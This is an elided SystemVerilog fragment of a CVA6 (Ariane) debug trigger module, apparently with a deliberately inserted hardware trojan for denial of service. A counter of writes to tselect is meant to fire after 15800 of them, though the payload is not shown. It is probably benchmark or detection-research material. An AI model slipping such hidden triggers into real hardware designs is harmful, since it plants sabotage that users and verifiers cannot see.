module trigger_module_trojan_DoS
  import ariane_pkg::*;
  import triggers_pkg::*;
#(
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=15800)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 15800;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (tselect_we) trojan_counter <= trojan_counter + 1;
